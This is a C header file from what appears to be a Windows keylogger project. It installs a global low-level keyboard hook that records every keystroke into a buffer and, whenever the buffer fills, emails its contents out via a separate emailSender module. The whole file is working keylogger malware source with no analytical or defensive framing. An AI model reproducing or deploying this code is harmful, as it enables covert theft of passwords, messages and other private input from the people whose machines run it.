#include "keyInterpretor.h"
#include "buffer.h"
#include "emailSender.h"
#ifndef HOOKMANAGER_H_INCLUDED
#define HOOKMANAGER_H_INCLUDED

LRESULT CALLBACK keyboardHookCallback(int, WPARAM, LPARAM);
int installKeyboardHook(void);
int uninstallKeyboardHook(void);

HHOOK keyboardHook;

int installKeyboardHook(void){
    //Retrieve the applications instance
    HINSTANCE instance = GetModuleHandle(NULL);
    //Set a global Windows Hook to capture keystrokes using the function declared above
    keyboardHook = SetWindowsHookEx( WH_KEYBOARD_LL, keyboardHookCallback, instance, 0);

    return keyboardHook != NULL ? 1 : 0;
}

int uninstallKeyboardHook(void){
    BOOL hookUninstalled = UnhookWindowsHookEx(keyboardHook);
    keyboardHook = NULL;
    return hookUninstalled ? 1 : 0;
}

//The function that implements the key logging functionality
LRESULT CALLBACK keyboardHookCallback( int nCode, WPARAM wParam, LPARAM lParam )
{
   char pressedKey;
   // Declare a pointer to the KBDLLHOOKSTRUCT
   KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
   int keyRelease = 0;
   switch( wParam )
   {
       case WM_KEYUP:
           keyRelease = 1;
       case WM_SYSKEYDOWN:
       case WM_KEYDOWN:
           pressedKey = pKeyBoard->vkCode;
       break;
       default:
           return CallNextHookEx( NULL, nCode, wParam, lParam );
       break;
   }

    //Deal with the key
    writeKey(pressedKey, buffer, keyRelease);
    if(isBufferFull()){
        //SendEmail
        sendEmail(buffer);
        clearBuffer();
    }

   return CallNextHookEx( NULL, nCode, wParam, lParam);
}

#endif // HOOKMANAGER_H_INCLUDED
